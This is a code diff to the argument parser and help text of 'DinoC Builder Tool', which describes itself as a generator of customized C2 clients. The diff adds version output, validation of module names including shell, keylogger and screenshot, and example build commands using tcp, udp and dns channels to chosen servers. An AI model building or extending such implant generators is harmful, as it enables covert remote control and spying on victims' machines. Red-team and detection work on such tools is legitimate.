@@ -20,6 +20,11 @@
 #define DEFAULT_VERSION_PATCH 0
 #define DEFAULT_ENCRYPTION_ALGORITHM ENCRYPTION_AES_256_GCM
 
+// Builder version
+#define BUILDER_VERSION_MAJOR 1
+#define BUILDER_VERSION_MINOR 0
+#define BUILDER_VERSION_PATCH 0
+
 // Helper functions
 static status_t parse_protocols(const char* protocols_str, protocol_type_t** protocols, size_t* count);
 static status_t parse_servers(const char* servers_str, char*** servers, size_t* count);
@@ -74,6 +79,7 @@ status_t builder_parse_args(int argc, char** argv, builder_config_t* config) {
         {"debug", no_argument, 0, 'g'},
         {"version", required_argument, 0, 'v'},
         {"help", no_argument, 0, 'h'},
+        {"version-info", no_argument, 0, 'i'},
         {0, 0, 0, 0}
     };
     
@@ -81,7 +87,7 @@ status_t builder_parse_args(int argc, char** argv, builder_config_t* config) {
     int opt;
     int option_index = 0;
     
-    while ((opt = getopt_long(argc, argv, "p:s:d:m:e:o:gv:h", long_options, &option_index)) != -1) {
+    while ((opt = getopt_long(argc, argv, "p:s:d:m:e:o:gv:hi", long_options, &option_index)) != -1) {
         switch (opt) {
             case 'p':
                 if (parse_protocols(optarg, &config->protocols, &config->protocol_count) != STATUS_SUCCESS) {
@@ -159,6 +165,12 @@ status_t builder_parse_args(int argc, char** argv, builder_config_t* config) {
                 
             case 'h':
                 print_usage(argv[0]);
+                builder_clean_config(config);
+                return STATUS_ERROR_INVALID_PARAM;  // Not really an error, but we want to exit
+                
+            case 'i':
+                printf("DinoC Builder Tool v%d.%d.%d\n", 
+                       BUILDER_VERSION_MAJOR, BUILDER_VERSION_MINOR, BUILDER_VERSION_PATCH);
                 builder_clean_config(config);
                 return STATUS_ERROR_INVALID_PARAM;  // Not really an error, but we want to exit
                 
@@ -558,6 +570,15 @@ static status_t parse_modules(const char* modules_str, char*** modules, size_t* 
             strncpy(module, start, len);
             module[len] = '\0';
             
+            // Validate module name
+            if (strcmp(module, "shell") != 0 && 
+                strcmp(module, "file") != 0 && 
+                strcmp(module, "keylogger") != 0 && 
+                strcmp(module, "screenshot") != 0) {
+                fprintf(stderr, "Warning: Unknown module '%s', it may not be supported\n", module);
+                // We don't return an error here, just a warning
+            }
+            
             module_array[index] = module;
             index++;
             
@@ -602,18 +623,30 @@ static status_t parse_encryption(const char* encryption_str, encryption_algorith
  * @brief Print usage information
  */
 static void print_usage(const char* program_name) {
+    printf("DinoC Builder Tool v1.0.0\n");
+    printf("A tool for generating customized C2 clients\n\n");
     printf("Usage: %s [options]\n", program_name);
     printf("Options:\n");
     printf("  -p, --protocol=PROTOCOLS   Comma-separated list of protocols (tcp,udp,ws,icmp,dns)\n");
+    printf("                             Required. At least one protocol must be specified.\n");
     printf("  -s, --servers=SERVERS      Comma-separated list of servers (host:port)\n");
+    printf("                             Required. At least one server must be specified.\n");
     printf("  -d, --domain=DOMAIN        Domain for DNS protocol\n");
+    printf("                             Required if DNS protocol is specified.\n");
     printf("  -m, --modules=MODULES      Comma-separated list of modules\n");
+    printf("                             Optional. Available modules: shell, file, keylogger, screenshot\n");
     printf("  -e, --encryption=ENC       Encryption algorithm (none,aes128,aes256,chacha20)\n");
+    printf("                             Optional. Default: aes256\n");
     printf("  -o, --output=FILE          Output file name\n");
+    printf("                             Optional. Default: client\n");
     printf("  -g, --debug                Enable debug mode\n");
+    printf("                             Optional. Default: disabled\n");
     printf("  -v, --version=VERSION      Version number (major.minor.patch)\n");
+    printf("                             Optional. Default: 1.0.0\n");
     printf("  -h, --help                 Display this help message\n");
     printf("\n");
-    printf("Example:\n");
+    printf("Examples:\n");
     printf("  %s -p tcp,dns -s 127.0.0.1:8080,127.0.0.1:53 -d test.com -m shell\n", program_name);
+    printf("  %s -p tcp -s 192.168.1.10:8080 -e aes256 -o custom_client -g\n", program_name);
+    printf("  %s -p tcp,udp,dns -s 10.0.0.1:8080,10.0.0.1:53 -d example.com -m shell,file -v 1.2.3\n", program_name);
 }
